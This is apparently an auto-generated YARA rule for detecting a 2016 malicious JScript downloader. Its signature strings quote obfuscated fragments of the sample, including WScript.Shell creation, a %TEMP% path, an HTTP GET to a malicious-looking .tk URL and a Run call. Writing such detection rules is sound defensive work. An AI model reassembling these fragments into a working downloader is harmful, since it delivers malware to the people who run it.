rule sig_20160427_c7bff074e671665c600f96f4bed824dc {
  meta:
    description = "datamaliciousorder - file 20160427_c7bff074e671665c600f96f4bed824dc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ffb3aa9c2c46fcc262c86cd363ba135e72cce6a5a419e06b688336fe31cb5b28"

  strings:
    $s1  = "function FvqizHdsqe() {return BzjdnRfusi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"5U0Yl8B" ascii
    $s2  = "function FvqizHdsqe() {return BzjdnRfusi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"5U0Yl8B" ascii
    $s3  = "var BzjdnRfusi = function MfdqvGyyeu() {return JiedvPxwky[BavjhHuuzj](\"WScript\"+\".Shell\");}(), IejksGudkd = 11;" fullword ascii
    $s4  = "XysmbMrkqa[YlxcoJjpdh](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s5  = "var JiedvPxwky = this[\"WScript\"];" fullword ascii
    $s6  = "if (XysmbMrkqa[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s7  = "function MryqfXjqde(XghcaTifip, YnyijWcdma){HinpqPwfjj = HinpqPwfjj * 1; return XghcaTifip - YnyijWcdma;};" fullword ascii
    $s8  = "function GoadtJkiqi(){return UfoaaZctiu + \"\";};" fullword ascii
    $s9  = "function AuqiiBuezj() {return ((UgzhlZtrfz == true) && (UgzhlZtrfz == OeockXstxn)) ? 1 : HinpqPwfjj;};" fullword ascii
    $s10 = "function IemhqCespx(YxbvwDhwew){BzjdnRfusi[\"R\"+\"un\"](YxbvwDhwew, HinpqPwfjj, HinpqPwfjj);};" fullword ascii
    $s11 = "}while (KetavAjuub);" fullword ascii
    $s12 = "function BfinyJforg(){return 23;};" fullword ascii
    $s13 = "return MryqfXjqde(CfugtLmhoy, VhakmKllrf);" fullword ascii
    $s14 = "var UgzhlZtrfz = false;" fullword ascii
    $s15 = "UgzhlZtrfz = true; " fullword ascii
    $s16 = "OeockXstxn = true; " fullword ascii
    $s17 = "var SjhgiEwidp = false;" fullword ascii
    $s18 = "var ShwjgQahhl = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function AajpxYdbtn(){return BavjhHuuzj;};" fullword ascii
    $s20 = "function QlktbLivfv()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}